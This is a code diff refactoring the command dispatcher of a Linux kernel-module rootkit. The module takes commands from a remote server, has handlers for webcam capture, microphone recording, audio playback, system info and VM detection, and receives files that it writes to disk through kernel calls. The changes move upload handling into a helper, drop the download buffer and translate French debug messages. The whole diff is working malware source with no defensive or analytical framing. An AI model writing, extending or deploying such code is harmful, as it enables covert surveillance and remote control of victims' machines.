@@ -21,14 +21,7 @@
 #include "download.h"
 #include "vanish.h"
 
-#define UPLOAD_BLOCK_SIZE 4096
-
 extern struct socket *get_worker_socket(void);
-
-// Download variables
-static bool sending_file = false;
-static char *download_buffer = NULL;
-static long download_size = 0;
 
 // Handler prototypes
 static int connect_handler(char *args);
@@ -48,8 +41,6 @@ static int start_webcam_handler(char *args);
 static int capture_image_handler(char *args);
 static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
-// static int upload_handler(char *args);
-// static int download_handler(char *args);
 static int sysinfo_handler(char *args);
 static int is_in_vm_handler(char *args);
 
@@ -113,100 +104,59 @@ static int help_handler(char *args) {
 }
 
 int rootkit_command(char *command, unsigned command_size) {
+    // Handle ongoing upload
     if (receiving_file) {
-        DBG_MSG("rootkit_command: réception chunk upload (%u octets)\n", command_size);
-
-        int chunk_size = command_size;
-
-        // Protect against buffer overflow
-        if (upload_received + chunk_size > upload_size)
-            chunk_size = upload_size - upload_received;
-
-        memcpy(upload_buffer + upload_received, command, chunk_size);
-        upload_received += chunk_size;
-
-        if (upload_received >= upload_size) {
-            DBG_MSG("rootkit_command: réception complète (%ld octets), écriture dans %s\n",
-                    upload_size, upload_path);
-
-            struct file *filp = filp_open(upload_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-            if (IS_ERR(filp)) {
-                ERR_MSG("rootkit_command: échec ouverture fichier\n");
-                send_to_server("❌ Erreur écriture fichier.\n");
-            }
-            else {
-                kernel_write(filp, upload_buffer, upload_size, &filp->f_pos);
-                filp_close(filp, NULL);
-                send_to_server("✅ Fichier écrit avec succès.\n");
-                DBG_MSG("rootkit_command: fichier écrit et fermé\n");
-            }
-
-            // Cleanup
-            kfree(upload_path);
-            vfree(upload_buffer);
-            receiving_file = false;
-        }
-
-        return 0;
-    }
-    else if (sending_file && strncmp(command, "READY", 5) == 0) {
-        DBG_MSG("rootkit_command: envoi fichier (%ld octets)\n", download_size);
-        send_to_server(download_buffer);
-
-        kfree(download_buffer);
-        download_buffer = NULL;
-        download_size = 0;
-        sending_file = false;
-        DBG_MSG("rootkit_command: reception chunk upload (%u octets)\n", command_size);
+        DBG_MSG("rootkit_command: receiving upload chunk (%u bytes)\n", command_size);
         return handle_upload_chunk(command, command_size);
-    } else if (download(command) == 0) {
+    }
+
+    // Handle ongoing download
+    if (download(command) == 0) {
         return 0;
     }
 
-    // Remove newline character if present
+    // Strip trailing newline if present
     command[strcspn(command, "\n")] = '\0';
 
+    // Validate null termination
     if (command[command_size - 1] != '\0') {
         ERR_MSG("rootkit_command: command is not null-terminated\n");
         return -EINVAL;
     }
 
-    // List of commands allowed without authentication
+    // Allow these commands without authentication
     const char *allowed_commands[] = { "connect", "help", "ping", NULL };
 
-    // Ensure the user is authenticated before executing most commands
     if (!is_user_auth()) {
-        int is_allowed = 0;
+        int allowed = 0;
         for (int i = 0; allowed_commands[i] != NULL; i++) {
             if (strncmp(command, allowed_commands[i], strlen(allowed_commands[i])) == 0) {
-                is_allowed = 1;
+                allowed = 1;
                 break;
             }
         }
 
-        if (!is_allowed) {
+        if (!allowed) {
             send_to_server("Authentication required. Use the 'connect' command to authenticate.\n");
-            ERR_MSG("rootkit_command: user attempted to execute a command without authentication\n");
+            ERR_MSG("rootkit_command: unauthorized command without authentication\n");
             return -FAILURE;
         }
     }
 
-    int i;
-    int ret_code = -EINVAL;
-    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
-        if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size) == 0) {
+    // Match command against registered handlers
+    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
+        if (strncmp(command, rootkit_commands_array[i].cmd_name,
+                    rootkit_commands_array[i].cmd_name_size) == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
-            while (args[0] == ' ')
-                args++;
-            ret_code = rootkit_commands_array[i].cmd_handler(args);
-            return ret_code;
+            while (*args == ' ') args++;
+            return rootkit_commands_array[i].cmd_handler(args);
         }
     }
 
+    // Unknown command
     ERR_MSG("rootkit_command: unknown command \"%s\"\n", command);
-    send_to_server("unknown command\n");
-
-    return ret_code;
+    send_to_server("Unknown command\n");
+    return -EINVAL;
 }
 
 static int change_password_handler(char *args) {
